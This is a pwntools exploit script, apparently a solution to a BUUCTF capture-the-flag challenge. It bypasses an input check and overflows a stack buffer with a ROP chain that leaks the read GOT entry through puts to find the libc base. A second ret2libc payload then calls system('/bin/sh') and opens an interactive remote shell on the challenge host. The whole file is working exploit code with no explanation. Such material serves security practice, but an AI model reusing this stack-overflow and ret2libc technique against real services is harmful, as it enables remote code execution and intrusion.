from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27628)
elf = ELF('./pwn')
exp = 0x8048825
ret = 0x8048502

io.send(b'\x00' + b'\xFF' * 0x1f)

payload = cyclic(0xe7 + 4)
payload += p32(elf.plt['puts'])
payload += p32(exp)
payload += p32(elf.got['read'])

io.sendlineafter(b'Correct\n', payload)
io.send(b'\x00' + b'\xFF' * 0x1f)
read = u32(io.recv(4))
libc = ELF('./libc-2.23.so')
base = read - libc.symbols['read']
sys = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

payload = cyclic(0xe7 + 4)
payload += p32(sys)
payload += p32(binsh)
payload += p32(binsh)

io.sendlineafter(b'Correct\n', payload)

io.interactive()